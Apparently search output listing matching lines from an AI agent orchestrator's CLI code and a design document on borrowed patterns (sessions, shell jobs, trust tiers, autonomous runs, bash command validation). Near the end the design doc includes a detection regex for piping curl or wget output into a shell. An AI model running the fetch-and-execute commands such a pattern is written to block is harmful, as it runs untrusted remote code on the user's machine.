src/orchestro/cli.py:681:        token = arg.strip()
src/orchestro/cli.py:682:        if not token:
src/orchestro/cli.py:685:        job = self._resolve_job(token)
src/orchestro/cli.py:686:        run_id = self._resolve_run_id(token)
src/orchestro/cli.py:688:            print(f"unknown job or run: {token}")
src/orchestro/cli.py:694:                current_job = self.app.db.get_shell_job(job.id)
src/orchestro/cli.py:696:                    for event in self.app.db.list_shell_job_events(current_job.id):
src/orchestro/cli.py:731:        job = self.app.db.get_shell_job(run_or_job)
src/orchestro/cli.py:827:        if not self.app.db.request_shell_job_cancel(job_id=job.id, reason=reason):
src/orchestro/cli.py:862:        if not self.app.db.request_shell_job_pause(job_id=job.id, reason=reason):
src/orchestro/cli.py:865:        self.app.db.update_shell_job(job_id=job.id, status="paused")
src/orchestro/cli.py:895:        if not self.app.db.request_shell_job_resume(job_id=job.id, reason=reason):
src/orchestro/cli.py:898:        self.app.db.update_shell_job(job_id=job.id, status="running")
src/orchestro/cli.py:928:        token = parts[0]
src/orchestro/cli.py:933:        job = self._resolve_job(token)
src/orchestro/cli.py:935:            print(f"unknown job or run: {token}")
src/orchestro/cli.py:1005:        path = Path(target).expanduser()
src/orchestro/cli.py:1006:        if not path.is_absolute():
src/orchestro/cli.py:1007:            path = (self.cwd / path).resolve()
src/orchestro/cli.py:1009:            path = path.resolve()
src/orchestro/cli.py:1010:        if not path.exists():
src/orchestro/cli.py:1011:            print(f"path not found: {path}")
src/orchestro/cli.py:1013:        if not path.is_dir():
src/orchestro/cli.py:1014:            print(f"not a directory: {path}")
src/orchestro/cli.py:1016:        self.cwd = path
src/orchestro/cli.py:1022:        path = Path(target).expanduser()
src/orchestro/cli.py:1023:        if not path.is_absolute():
src/orchestro/cli.py:1024:            path = (self.cwd / path).resolve()
src/orchestro/cli.py:1026:            path = path.resolve()
src/orchestro/cli.py:1027:        if not path.exists():
src/orchestro/cli.py:1028:            print(f"path not found: {path}")
src/orchestro/cli.py:1030:        if path.is_file():
src/orchestro/cli.py:1031:            print(path.name)
src/orchestro/cli.py:1033:        entries = sorted(path.iterdir(), key=lambda item: (not item.is_dir(), item.name.lower()))
src/orchestro/cli.py:1084:        suite = Path(parts[0]) if parts else default_benchmark_suite_path()
src/orchestro/cli.py:1088:            suite_path=suite,
src/orchestro/cli.py:1102:        suite = Path(parts[0]) if parts else default_benchmark_suite_path()
src/orchestro/cli.py:1105:            suite_path=suite,
src/orchestro/cli.py:1168:        tokens = []
src/orchestro/cli.py:1173:                tokens.append(part)
src/orchestro/cli.py:1174:        if not tokens:
src/orchestro/cli.py:1177:        run_id = self._resolve_run_id(tokens[0])
src/orchestro/cli.py:1179:            print(f"unknown job or run: {tokens[0]}")
src/orchestro/cli.py:1210:        if self.current_session_id:
src/orchestro/cli.py:1211:            totals = self.app.db.sum_session_tokens(session_id=self.current_session_id)
src/orchestro/cli.py:1212:            cache = self.app.db.sum_session_cache_tokens(session_id=self.current_session_id)
src/orchestro/cli.py:1213:            print("Session token usage:")
src/orchestro/cli.py:1215:            totals = self.app.db.sum_session_tokens(run_ids=self.shell_invocation_run_ids)
src/orchestro/cli.py:1216:            cache = self.app.db.sum_session_cache_tokens(run_ids=self.shell_invocation_run_ids)
src/orchestro/cli.py:1217:            print("Shell invocation token usage:")
src/orchestro/cli.py:1218:        print(f"  Prompt tokens:     {totals['prompt_tokens']:,}")
src/orchestro/cli.py:1219:        print(f"  Completion tokens: {totals['completion_tokens']:,}")
src/orchestro/cli.py:1220:        print(f"  Total tokens:      {totals['total_tokens']:,}")
src/orchestro/cli.py:1221:        if cache["cache_read_tokens"]:
src/orchestro/cli.py:1222:            print(f"  Cache read tokens:  {cache['cache_read_tokens']:,}")
src/orchestro/cli.py:1223:        if cache["cache_write_tokens"]:
src/orchestro/cli.py:1224:            print(f"  Cache write tokens: {cache['cache_write_tokens']:,}")
src/orchestro/cli.py:1228:            list(self.app.db.list_session_runs(self.current_session_id, limit=500))
src/orchestro/cli.py:1229:            if self.current_session_id
src/orchestro/cli.py:1230:            else [self.app.db.get_run(rid) for rid in self.shell_invocation_run_ids]
src/orchestro/cli.py:1237:            pt = run_obj.prompt_tokens if hasattr(run_obj, "prompt_tokens") else 0
src/orchestro/cli.py:1238:            ct = run_obj.completion_tokens if hasattr(run_obj, "completion_tokens") else 0
src/orchestro/cli.py:1244:            cost = estimate_cost(prompt_tokens=pt, completion_tokens=ct, backend_name=backend_name)
src/orchestro/cli.py:1248:                cost_lines.append(f"    {backend_name}: free (local)  {pt+ct:,} tokens")
src/orchestro/cli.py:1250:                cost_lines.append(f"    {backend_name}: ${cost:.6f}  {pt+ct:,} tokens")
src/orchestro/cli.py:1258:    def do_session(self, arg: str) -> None:
src/orchestro/cli.py:1265:            if not self.current_session_id:
src/orchestro/cli.py:1266:                print("no current session")
src/orchestro/cli.py:1268:            _print_session(self.app, self.current_session_id)
src/orchestro/cli.py:1273:            session_id = _create_session(self.app, title=title)
src/orchestro/cli.py:1274:            self.current_session_id = session_id
src/orchestro/cli.py:1276:            _print_session(self.app, session_id)
src/orchestro/cli.py:1280:                print("usage: /session resume <session-id>")
src/orchestro/cli.py:1282:            if self.app.db.get_session(parts[1]) is None:
src/orchestro/cli.py:1283:                print("session not found")
src/orchestro/cli.py:1285:            self.current_session_id = parts[1]
src/orchestro/cli.py:1287:            _print_session(self.app, parts[1])
src/orchestro/cli.py:1291:            for session in self.app.db.list_sessions(limit=20, status=status):
src/orchestro/cli.py:1292:                title = session.title or "-"
src/orchestro/cli.py:1293:                print(f"{session.id}	{session.status}	{title}	{session.updated_at}")
src/orchestro/cli.py:1296:            if not self.current_session_id:
src/orchestro/cli.py:1297:                print("no current session")
src/orchestro/cli.py:1300:            session_id = _fork_session(self.app, self.current_session_id, fork_point_run_id=self.last_run_id, title=title)
src/orchestro/cli.py:1301:            self.current_session_id = session_id
src/orchestro/cli.py:1303:            _print_session(self.app, session_id)
src/orchestro/cli.py:1306:            target = self.current_session_id
src/orchestro/cli.py:1310:                print("no current session")
src/orchestro/cli.py:1312:            _compact_session(self.app, target)
src/orchestro/cli.py:1313:            _print_session(self.app, target)
src/orchestro/cli.py:1315:        print("usage: /session [new [title]|resume <id>|list [status]|fork [title]|compact [id]]")
src/orchestro/cli.py:1535:            self.app.execute_prepared_run(prepared, approve_tool=self._approve_tool_interactive)
src/orchestro/cli.py:1557:                self.app.db.attach_shell_job_run(job_id=job_id, run_id=prepared.run_id)
src/orchestro/cli.py:1558:                self.app.execute_prepared_run(
src/orchestro/cli.py:1560:                    cancel_requested=lambda: self.app.db.is_shell_job_cancel_requested(job_id),
src/orchestro/cli.py:1561:                    control_state=lambda: self.app.db.get_shell_job_control_state(job_id),
src/orchestro/cli.py:1575:                    self.app.db.append_shell_job_event(
src/orchestro/cli.py:1581:                    self.app.db.update_shell_job(job_id=job_id, status="canceled")
src/orchestro/cli.py:1583:                self.app.db.update_shell_job(job_id=job_id, status="done")
src/orchestro/cli.py:1584:                self.app.db.append_shell_job_event(
src/orchestro/cli.py:1592:                self.app.db.update_shell_job(job_id=job_id, status="failed", error_message=str(exc))
src/orchestro/cli.py:1593:                self.app.db.append_shell_job_event(
src/orchestro/cli.py:1600:        self.app.db.create_shell_job(
src/orchestro/cli.py:1642:        self._track_shell_run(prepared.run_id)
src/orchestro/cli.py:1654:                "mode": "plan-step-execution",
src/orchestro/cli.py:1737:        suite_path = Path(arg.strip() or default_benchmark_suite_path())
src/orchestro/cli.py:1740:            suite_path=suite_path,
src/orchestro/cli.py:1849:            self.app.db.request_shell_job_resume(job_id=record.job_id, reason=f"approval {decision}")
src/orchestro/cli.py:2011:        print("session overrides:")
src/orchestro/cli.py:2012:        if policy.session_overrides:
src/orchestro/cli.py:2013:            for name, tier in sorted(policy.session_overrides.items()):
src/orchestro/cli.py:2043:        new_session = dict(self.app.trust_policy.session_overrides)
src/orchestro/cli.py:2044:        new_session[tool_name] = tier
src/orchestro/cli.py:2048:            session_overrides=new_session,
src/orchestro/cli.py:2050:        print(f"{tool_name} -> {tier} (session)")
src/orchestro/cli.py:2099:        job_id, run_id = self._spawn_background_job(goal, parent_run_id=parent_run_id)
src/orchestro/cli.py:2219:            "child_run_spawned", "child_run_completed", "tool_rejected",
src/orchestro/cli.py:2274:        print(f"synced {facts_path()}")
src/orchestro/cli.py:2338:        output_path = Path(output)
src/orchestro/cli.py:2339:        written = exporter(examples, output_path)
src/orchestro/cli.py:2341:        print(f"wrote {written} examples to {output_path}")
src/orchestro/cli.py:2411:            print("usage: /collection_ingest <collection-id> <path>")
src/orchestro/cli.py:2413:        collection_id, raw_path = parts[0], parts[1]
src/orchestro/cli.py:2418:        target = Path(raw_path).expanduser()
src/orchestro/cli.py:2424:            print(f"path not found: {target}")
src/orchestro/cli.py:2580:        self._track_shell_run(prepared.run_id)
src/orchestro/cli.py:2587:            self.app.execute_prepared_run(
src/orchestro/cli.py:2607:                **({"session_id": self.current_session_id} if self.current_session_id else {}),
src/orchestro/cli.py:2614:    def _spawn_background_job(self, goal: str, *, parent_run_id: str | None) -> tuple[str, str | None]:
src/orchestro/cli.py:2622:                self.app.db.attach_shell_job_run(job_id=job_id, run_id=prepared.run_id)
src/orchestro/cli.py:2623:                self.app.execute_prepared_run(
src/orchestro/cli.py:2625:                    cancel_requested=lambda: self.app.db.is_shell_job_cancel_requested(job_id),
src/orchestro/cli.py:2626:                    control_state=lambda: self.app.db.get_shell_job_control_state(job_id),
src/orchestro/cli.py:2637:                    self.app.db.append_shell_job_event(
src/orchestro/cli.py:2643:                    self.app.db.update_shell_job(job_id=job_id, status="canceled")
src/orchestro/cli.py:2645:                self.app.db.update_shell_job(job_id=job_id, status="done")
src/orchestro/cli.py:2646:                self.app.db.append_shell_job_event(
src/orchestro/cli.py:2654:                self.app.db.update_shell_job(job_id=job_id, status="failed", error_message=str(exc))
src/orchestro/cli.py:2655:                self.app.db.append_shell_job_event(
src/orchestro/cli.py:2662:        self.app.db.create_shell_job(
src/orchestro/cli.py:2674:            job = self.app.db.get_shell_job(job_id)
src/orchestro/cli.py:2677:                self._track_shell_run(run_id)
src/orchestro/cli.py:2748:            self.app.db.append_shell_job_event(
src/orchestro/cli.py:2760:            self.app.db.request_shell_job_pause(job_id=job_id, reason=f"approval pending for {pattern}")
src/orchestro/cli.py:2770:            if self.app.db.is_shell_job_cancel_requested(job_id):
src/orchestro/cli.py:2775:        records = self.app.db.consume_pending_shell_job_inputs(job_id=job_id)
src/orchestro/cli.py:2788:        self.app.db.enqueue_shell_job_input(
src/orchestro/cli.py:2794:        self.app.db.append_shell_job_event(
src/orchestro/cli.py:2810:            self.app.db.request_shell_job_resume(job_id=job_id, reason="operator input injected")
src/orchestro/cli.py:2832:    def _resolve_run_id(self, token: str) -> str | None:
src/orchestro/cli.py:2833:        job = self.app.db.get_shell_job(token)
src/orchestro/cli.py:2836:        run = self.app.db.get_run(token)
src/orchestro/cli.py:2838:            return token
src/orchestro/cli.py:2841:    def _resolve_job(self, token: str) -> object | None:
src/orchestro/cli.py:2842:        job = self.app.db.get_shell_job(token)
src/orchestro/cli.py:2845:        run = self.app.db.get_run(token)
src/orchestro/cli.py:2848:        return self.app.db.get_shell_job_by_run_id(run.id)
src/orchestro/cli.py:2855:        if run.session_id:
src/orchestro/cli.py:2856:            metadata.setdefault("session_id", run.session_id)
src/orchestro/cli.py:2896:        tokens = payload.get("total_tokens", "?")
src/orchestro/cli.py:2897:        return f"{etype}: tokens={tokens}"
src/orchestro/cli.py:2898:    if etype in ("child_run_spawned", "child_run_completed"):
src/orchestro/cli.py:2922:    if run.session_id:
src/orchestro/cli.py:2923:        print(f"session: {run.session_id}")
src/orchestro/cli.py:2941:    if run.total_tokens:
src/orchestro/cli.py:2942:        print(f"tokens: {run.prompt_tokens} prompt + {run.completion_tokens} completion = {run.total_tokens} total")
src/orchestro/cli.py:2977:        if run.total_tokens:
src/orchestro/cli.py:2978:            print(f"  tokens:   {run.total_tokens}")
src/orchestro/cli.py:3014:def _print_shell_job(app: Orchestro, job_id: str) -> None:
src/orchestro/cli.py:3015:    job = app.db.get_shell_job(job_id)
src/orchestro/cli.py:3040:    events = app.db.list_shell_job_events(job.id)
src/orchestro/cli.py:3045:    inputs = app.db.list_shell_job_inputs(job_id=job.id, limit=20)
src/orchestro/cli.py:3054:    print(f"global_instructions: {global_instructions_path()}")
src/orchestro/cli.py:3060:        print(f"{source.label}: {source.path}")
src/orchestro/cli.py:3072:        print(f"{source.label}: {source.path}")
src/orchestro/cli.py:3118:        path = Path(handle.name)
src/orchestro/cli.py:3121:        completed = subprocess.run(["bash", "-lc", f"{editor} {shlex.quote(str(path))}"], check=False)
src/orchestro/cli.py:3124:        content = path.read_text(encoding="utf-8")
src/orchestro/cli.py:3126:        path.unlink(missing_ok=True)
src/orchestro/cli.py:3341:        path = Path(handle.name)
src/orchestro/cli.py:3345:            ["bash", "-lc", f"{editor} {shlex.quote(str(path))}"],
src/orchestro/cli.py:3350:        content = path.read_text(encoding="utf-8")
src/orchestro/cli.py:3352:        path.unlink(missing_ok=True)
src/orchestro/cli.py:3365:def _create_session(app: Orchestro, *, title: str | None, parent_session_id: str | None = None, fork_point_run_id: str | None = None, context_snapshot: str | None = None) -> str:
src/orchestro/cli.py:3366:    session_id = str(uuid4())
src/orchestro/cli.py:3367:    app.db.create_session(
src/orchestro/cli.py:3368:        session_id=session_id,
src/orchestro/cli.py:3370:        parent_session_id=parent_session_id,
src/orchestro/cli.py:3374:    return session_id
src/orchestro/cli.py:3377:def _fork_session(app: Orchestro, session_id: str, *, fork_point_run_id: str | None, title: str | None = None) -> str:
src/orchestro/cli.py:3378:    parent = app.db.get_session(session_id)
src/orchestro/cli.py:3380:        raise ValueError("session not found")
src/orchestro/cli.py:3381:    fork_title = title or (f"Fork of {parent.title}" if parent.title else "Forked session")
src/orchestro/cli.py:3382:    return _create_session(
src/orchestro/cli.py:3385:        parent_session_id=parent.id,
src/orchestro/cli.py:3391:def _compact_session(app: Orchestro, session_id: str, *, limit: int = 50) -> None:
src/orchestro/cli.py:3392:    session = app.db.get_session(session_id)
src/orchestro/cli.py:3393:    if session is None:
src/orchestro/cli.py:3394:        raise ValueError("session not found")
src/orchestro/cli.py:3395:    runs = app.db.list_session_runs(session_id, limit=limit)
src/orchestro/cli.py:3411:    summary = f"Compacted {len(excerpt_runs)} run(s)" if excerpt_runs else "Compacted empty session"
src/orchestro/cli.py:3412:    app.db.update_session(session_id=session_id, summary=summary, context_snapshot=snapshot)
src/orchestro/cli.py:3415:def _print_session(app: Orchestro, session_id: str) -> None:
src/orchestro/cli.py:3416:    session = app.db.get_session(session_id)
src/orchestro/cli.py:3417:    if session is None:
src/orchestro/cli.py:3418:        print(f"session not found: {session_id}")
src/orchestro/cli.py:3420:    print(f"id: {session.id}")
src/orchestro/cli.py:3421:    print(f"status: {session.status}")
src/orchestro/cli.py:3422:    print(f"title: {session.title or '-'}")
src/orchestro/cli.py:3423:    print(f"parent: {session.parent_session_id or '-'}")
src/orchestro/cli.py:3424:    print(f"fork_point_run_id: {session.fork_point_run_id or '-'}")
src/orchestro/cli.py:3425:    if session.summary:
src/orchestro/cli.py:3426:        print(f"summary: {session.summary}")
src/orchestro/cli.py:3427:    print(f"created_at: {session.created_at}")
src/orchestro/cli.py:3428:    print(f"updated_at: {session.updated_at}")
src/orchestro/cli.py:3429:    runs = app.db.list_session_runs(session_id, limit=10)
src/orchestro/cli.py:3458:    return Orchestro(OrchestroDB(db_path()))
src/orchestro/cli.py:3487:    sync_facts_file(facts_path(), db.list_facts(limit=5000))
src/orchestro/cli.py:3584:    approvals = ToolApprovalStore(tool_approvals_path())
src/orchestro/cli.py:3631:            app.execute_prepared_run(
src/orchestro/cli.py:3647:    if args.command == "shell":
src/orchestro/cli.py:3648:        shell_backend = args.backend
src/orchestro/cli.py:3649:        shell_model_override = None
src/orchestro/cli.py:3652:                shell_backend, shell_model_override = resolve_alias(args.model, app.backends)
src/orchestro/cli.py:3656:        elif shell_backend != "auto":
src/orchestro/cli.py:3658:                shell_backend, shell_model_override = resolve_alias(shell_backend, app.backends)
src/orchestro/cli.py:3664:        shell = OrchestroShell(
src/orchestro/cli.py:3666:            backend=shell_backend,
src/orchestro/cli.py:3669:            backend_model=shell_model_override,
src/orchestro/cli.py:3671:        shell.context_providers = _parse_context_providers(args.providers)
src/orchestro/cli.py:3673:            shell.cmdloop()
src/orchestro/cli.py:3795:    if args.command == "sessions":
src/orchestro/cli.py:3796:        for session in app.db.list_sessions(limit=args.limit, status=args.status):
src/orchestro/cli.py:3797:            title = session.title or "-"
src/orchestro/cli.py:3798:            print(f"{session.id}	{session.status}	{title}	{session.updated_at}")
src/orchestro/cli.py:3801:    if args.command == "session-new":
src/orchestro/cli.py:3802:        session_id = _create_session(app, title=args.title)
src/orchestro/cli.py:3803:        print(session_id)
src/orchestro/cli.py:3804:        _print_session(app, session_id)
src/orchestro/cli.py:3807:    if args.command == "session-show":
src/orchestro/cli.py:3808:        _print_session(app, args.session_id)
src/orchestro/cli.py:3811:    if args.command == "session-resume":
src/orchestro/cli.py:3812:        _print_session(app, args.session_id)
src/orchestro/cli.py:3815:    if args.command == "session-fork":
src/orchestro/cli.py:3816:        session_id = _fork_session(app, args.session_id, fork_point_run_id=args.run_id, title=args.title)
src/orchestro/cli.py:3817:        print(session_id)
src/orchestro/cli.py:3818:        _print_session(app, session_id)
src/orchestro/cli.py:3821:    if args.command == "session-compact":
src/orchestro/cli.py:3822:        _compact_session(app, args.session_id, limit=args.limit)
src/orchestro/cli.py:3823:        _print_session(app, args.session_id)
src/orchestro/cli.py:3970:        shell = OrchestroShell(app, backend="mock", strategy="direct", domain=None)
src/orchestro/cli.py:3971:        shell.do_plan_run(args.plan_id)
src/orchestro/cli.py:3977:            suite_path=Path(args.suite),
src/orchestro/cli.py:3989:            suite_path=Path(args.suite),
src/orchestro/cli.py:4002:            suite_path=Path(args.suite),
src/orchestro/cli.py:4096:            app.db.request_shell_job_resume(job_id=record.job_id, reason=f"approval {args.decision}")
src/orchestro/cli.py:4143:            app.execute_prepared_run(
src/orchestro/cli.py:4260:    if args.command == "shell-jobs":
src/orchestro/cli.py:4261:        for job in app.db.list_shell_jobs(limit=args.limit):
src/orchestro/cli.py:4268:    if args.command == "shell-job-show":
src/orchestro/cli.py:4269:        _print_shell_job(app, args.job_id)
src/orchestro/cli.py:4272:    if args.command == "shell-job-inject":
src/orchestro/cli.py:4273:        job = app.db.get_shell_job(args.job_id)
src/orchestro/cli.py:4275:            print("shell job not found")
src/orchestro/cli.py:4278:        app.db.enqueue_shell_job_input(
src/orchestro/cli.py:4284:        app.db.append_shell_job_event(
src/orchestro/cli.py:4320:            app.db.request_shell_job_resume(job_id=job.id, reason="operator input injected")
src/orchestro/cli.py:4393:        print(facts_path())
src/orchestro/cli.py:4564:        output_path = Path(args.output)
src/orchestro/cli.py:4565:        written = exporter(examples, output_path)
src/orchestro/cli.py:4567:        print(f"wrote {written} examples to {output_path}")
src/orchestro/cli.py:4619:        target = Path(args.path).expanduser()
src/orchestro/cli.py:4625:            print(f"path not found: {target}", file=sys.stderr)
docs/borrowed-patterns.md:17:Orchestro currently has `reflect-retry` as a single-shot mechanism and postmortem recording for failed runs. There is no structured categorization of failures beyond the basic postmortem categories (`timeout`, `tool`, `backend`, `workspace`, `general`), no per-category recovery logic, no escalation path, and no attempt tracking.
docs/borrowed-patterns.md:29:- `tool_crash` — tool execution raised an exception
docs/borrowed-patterns.md:75:- `Orchestro.execute_prepared_run()` — wrap the execution path with failure classification and recovery dispatch
docs/borrowed-patterns.md:83:Claw has a full `PluginManager` with install, enable, disable, uninstall lifecycle. Plugins are discovered from a directory, have metadata (name, version, capabilities), and register hooks. The hook system supports `PreToolUse`, `PostToolUse`, and `PostToolUseFailure` events. Hooks can abort execution, modify context, or emit progress events. There is also a `PluginRegistry` for bundled plugins and a health-check system for degraded plugins.
docs/borrowed-patterns.md:87:Orchestro has no extensibility mechanism. Adding a new backend requires editing `backend_profiles.py`. Adding a new tool requires editing `tools.py`. Adding a new context provider requires editing the orchestrator. Adding custom postprocessing or validation requires editing the execution path.
docs/borrowed-patterns.md:97:- `pre_run` — before a run starts execution (can modify context, select strategy)
docs/borrowed-patterns.md:99:- `pre_tool` — before a tool call executes (can block, modify args, require approval)
docs/borrowed-patterns.md:102:- `on_plan_step` — when a plan step is about to execute (can inject guidance)
docs/borrowed-patterns.md:115:- `abort` — stop execution with a reason
docs/borrowed-patterns.md:132:- `Orchestro.execute_prepared_run()` — call `pre_run` and `post_run` hooks
docs/borrowed-patterns.md:133:- Tool execution in the tool-loop — call `pre_tool` and `post_tool` hooks
docs/borrowed-patterns.md:205:- Approval resolution in shell jobs — check policies before prompting operator
docs/borrowed-patterns.md:206:- `execute_prepared_run()` — evaluate post-run and failure policies
docs/borrowed-patterns.md:213:Claw has JSONL-based session persistence with rotation at 256KB, compaction (summarizing old messages to stay within context limits), and forking (branching a session with parent provenance tracking). Sessions can be resumed across process restarts. Compaction replaces old conversation turns with a compressed summary while preserving recent context.
docs/borrowed-patterns.md:217:Orchestro tracks individual runs in SQLite but has no concept of a session that spans multiple related runs. Each shell invocation starts fresh. There is no way to:
docs/borrowed-patterns.md:219:- Resume a multi-run investigation across shell restarts
docs/borrowed-patterns.md:221:- Compact a long session to stay within model context limits
docs/borrowed-patterns.md:224:The plan system partially addresses this (plans group related steps), but plans are task-scoped. Sessions would be broader — tracking an entire working session with its context, decisions, and branches.
docs/borrowed-patterns.md:228:Add a `sessions` table:
docs/borrowed-patterns.md:231:CREATE TABLE sessions (
docs/borrowed-patterns.md:233:    parent_session_id TEXT,
docs/borrowed-patterns.md:244:Link runs to sessions:
docs/borrowed-patterns.md:247:ALTER TABLE runs ADD COLUMN session_id TEXT REFERENCES sessions(id);
docs/borrowed-patterns.md:250:Add session management to the shell:
docs/borrowed-patterns.md:252:- `/session` — show current session info
docs/borrowed-patterns.md:253:- `/session new [title]` — start a new session
docs/borrowed-patterns.md:254:- `/session resume [id]` — resume a previous session
docs/borrowed-patterns.md:255:- `/session fork` — fork the current session from the current point
docs/borrowed-patterns.md:256:- `/session list` — list recent sessions
docs/borrowed-patterns.md:257:- `/session compact` — summarize old context in the current session
docs/borrowed-patterns.md:261:1. Collect all run goals and outputs in the session up to a cutoff point.
docs/borrowed-patterns.md:263:3. Store the summary as the session's `context_snapshot`.
docs/borrowed-patterns.md:268:1. Create a new session with `parent_session_id` set.
docs/borrowed-patterns.md:270:3. Allow independent continuation from both the original and forked session.
docs/borrowed-patterns.md:274:- `Orchestro.start_run()` — attach session_id to new runs
docs/borrowed-patterns.md:275:- Context assembly — include session context_snapshot when building run context
docs/borrowed-patterns.md:276:- Shell startup — offer to resume the most recent active session
docs/borrowed-patterns.md:311:Add `--model` / `-m` flag to `orchestro ask` and the shell's default input that accepts aliases.
docs/borrowed-patterns.md:327:Orchestro's shell jobs track status as simple strings (`pending`, `running`, `paused`, `done`, `failed`, `cancelled`). There is no validation of state transitions — a job could theoretically go from `paused` to `done` without passing through `running`. There is no event emission on state changes, no trust gate concept, and no formal lifecycle.
docs/borrowed-patterns.md:329:This matters as background job complexity grows. With recovery recipes, policy-driven automation, and session management, the system needs reliable state tracking to avoid race conditions and invalid transitions.
docs/borrowed-patterns.md:339:- `running` — actively executing
docs/borrowed-patterns.md:340:- `paused` — operator or policy paused execution
docs/borrowed-patterns.md:373:2. Emit a `shell_job_event` with type `state_changed` on every transition.
docs/borrowed-patterns.md:381:- `OrchestroDB.update_shell_job_status()` — enforce valid transitions
docs/borrowed-patterns.md:427:1. On shell startup, read the server config.
docs/borrowed-patterns.md:433:7. On shell exit, send shutdown notifications and terminate child processes.
docs/borrowed-patterns.md:435:Degraded startup: if a server fails to start or times out during initialization, log the failure, skip that server, and continue. Report degraded servers in the shell status.
docs/borrowed-patterns.md:448:- Tool execution in tool-loop — dispatch MCP tool calls through the client
docs/borrowed-patterns.md:449:- `/tools` shell command — show MCP tools with their server of origin
docs/borrowed-patterns.md:456:Any MCP-compatible client — Claude Code, Claude Desktop, or any agent — could query Orchestro's corrections, facts, postmortems, and domain constitutions as context. Personal operator knowledge ("always use `--dry-run` first for rsync", "this codebase expects snake_case for test functions") accumulated in Orchestro becomes available to every agent, not just Orchestro sessions.
docs/borrowed-patterns.md:473:The MCP server mode and client mode are independent and can coexist. The client consumes external tools; the server publishes Orchestro's memory. Together they make Orchestro the central knowledge node in a local multi-agent setup — the place where corrections accumulate across all tools and sessions.
docs/borrowed-patterns.md:483:Orchestro's `cli.py` is 2,960 lines — the largest file in the project. The shell class has 50+ `do_*` methods mixed with helper methods, argument parsing, output formatting, and state management. Adding a new command means editing this monolith.
docs/borrowed-patterns.md:490:- Reduce the cognitive load of working on the shell
docs/borrowed-patterns.md:491:- Make it easier to share commands between the CLI and the interactive shell
docs/borrowed-patterns.md:511:└── session.py           # /session (new, from pattern 4)
docs/borrowed-patterns.md:523:    def execute(self, shell, args):
docs/borrowed-patterns.md:527:The `CommandRegistry` discovers commands from the package and from plugins, resolves aliases, and dispatches. The shell's `default()` and `do_*` methods become thin wrappers that delegate to the registry.
docs/borrowed-patterns.md:529:### Migration path
docs/borrowed-patterns.md:536:4. Keep the shell class as the REPL host but with most logic delegated.
docs/borrowed-patterns.md:659:- `Orchestro.execute_prepared_run()` — set initial quality level based on strategy
docs/borrowed-patterns.md:660:- Verifier execution — upgrade quality level on pass
docs/borrowed-patterns.md:675:Claw's `ConversationRuntime::run_turn()` is a fully autonomous execution loop: push input → stream API → process response → for each tool use: run pre-hook → check permissions → execute → run post-hook → push results → loop until done or max iterations. Auto-compaction fires when token count crosses a threshold. No human input is required at any step when permissions are pre-configured.
docs/borrowed-patterns.md:686:Add an `autonomous` flag to runs (set via `--autonomous` on `orchestro ask` or `/bg --autonomous` in the shell):
docs/borrowed-patterns.md:693:    escalation_channel: str = "shell"  # or "webhook", "file"
docs/borrowed-patterns.md:710:Claw has a three-tier `TrustPolicy`: `AutoTrust` (fully autonomous), `RequireApproval` (escalate to human), `Deny` (hard block). A `TrustResolver` evaluates the working directory against allowlisted and denied root paths. Workers in trusted directories get `trust_auto_resolve=true` and clear trust gates automatically.
docs/borrowed-patterns.md:769:Add a workspace boundary enforcer that prevents path traversal regardless of trust tier. Even `full` trust should not allow writes outside the declared workspace root.
docs/borrowed-patterns.md:829:The scheduler runs as a background thread in the shell (or as a standalone daemon via `orchestro scheduler`). On each tick (every 60 seconds), it evaluates which tasks are due and starts them as background shell jobs with `autonomous=True`.
docs/borrowed-patterns.md:891:The agent-callable `spawn_subagent` tool (already in the architecture doc's planned tool list) should create a task from a `TaskPacket`, start a child run with bounded context, and track it:
docs/borrowed-patterns.md:893:1. Parent agent calls `spawn_subagent` with a `TaskPacket`.
docs/borrowed-patterns.md:896:4. Child run executes autonomously using the same recovery, policy, and trust infrastructure.
docs/borrowed-patterns.md:906:Claw's `ConversationRuntime` calls `maybe_auto_compact()` when cumulative input tokens cross a configurable threshold (default 100,000). Compaction summarizes old conversation turns while preserving recent context. A `SummaryCompressionBudget` controls the output size. The compression system normalizes whitespace, deduplicates lines, and prioritizes content by type (headers > details > bullets > filler).
docs/borrowed-patterns.md:916:Add context tracking to the tool-loop execution path in `orchestrator.py`.
docs/borrowed-patterns.md:918:Track cumulative token count (estimated) per run. After each tool-loop step:
docs/borrowed-patterns.md:920:1. Estimate current context size (character count / 4 as a rough token proxy, or use the backend's tokenizer if available).
docs/borrowed-patterns.md:930:Preserve: key findings, file paths mentioned, errors encountered, decisions made.
docs/borrowed-patterns.md:934:For backends that report token usage in their responses, use actual counts instead of estimates.
docs/borrowed-patterns.md:951:Queue the extracted items as `proposed` facts and corrections in the database. The operator reviews and accepts them via the existing `fact-add` and `correction-add` flows. Every long tool-loop session automatically contributes to the knowledge base with zero extra operator effort.
docs/borrowed-patterns.md:961:Orchestro's only escalation mechanism is blocking on stdin in the interactive shell. For autonomous and background runs, this means failures are silent until the operator checks. There is no way to notify the operator that a run needs attention without them actively looking.
docs/borrowed-patterns.md:969:- `shell` — write to the shell's notification area (for interactive sessions)
docs/borrowed-patterns.md:972:- `command` — run a shell command with the escalation payload as stdin (maximum flexibility)
docs/borrowed-patterns.md:978:  default: shell
docs/borrowed-patterns.md:982:    url: https://ntfy.sh/orchestro-alerts
docs/borrowed-patterns.md:1022:Define an autonomy budget per run or per session:
docs/borrowed-patterns.md:1032:    max_child_tasks: int = 5          # sub-agent spawns
docs/borrowed-patterns.md:1072:4. **Run executes** (11.1) → tool-loop with policy-driven approvals, no stdin blocking
docs/borrowed-patterns.md:1077:9. **If complex task** → parent spawns sub-agents (11.4) with bounded context and acceptance tests
docs/borrowed-patterns.md:1096:For a 6-step tool-loop run with a 2,000-token system prompt, prompt caching reduces input token cost by ~80% on steps 2-6. For Orchestro's target use case of extended local model runs, this directly extends how far the autonomy budget can go on a given token quota.
docs/borrowed-patterns.md:1128:# OpenAI-compatible backends return usage.cache_read_input_tokens
docs/borrowed-patterns.md:1129:if "cache_read_input_tokens" in usage:
docs/borrowed-patterns.md:1131:        "cache_read_tokens": usage["cache_read_input_tokens"],
docs/borrowed-patterns.md:1132:        "cache_write_tokens": usage.get("cache_creation_input_tokens", 0)
docs/borrowed-patterns.md:1148:Claw has 18 validation submodules in `bash_validation.rs` that perform static analysis on bash commands before execution. Each module targets a category of destructive or dangerous operations:
docs/borrowed-patterns.md:1185:    # Pipe to shell (curl | bash, wget | sh)
docs/borrowed-patterns.md:1186:    (re.compile(r'(curl|wget)\b.*\|\s*(ba)?sh\b'), "remote_exec"),
docs/borrowed-patterns.md:1206:Integrate with the tool execution path. Before any bash call:
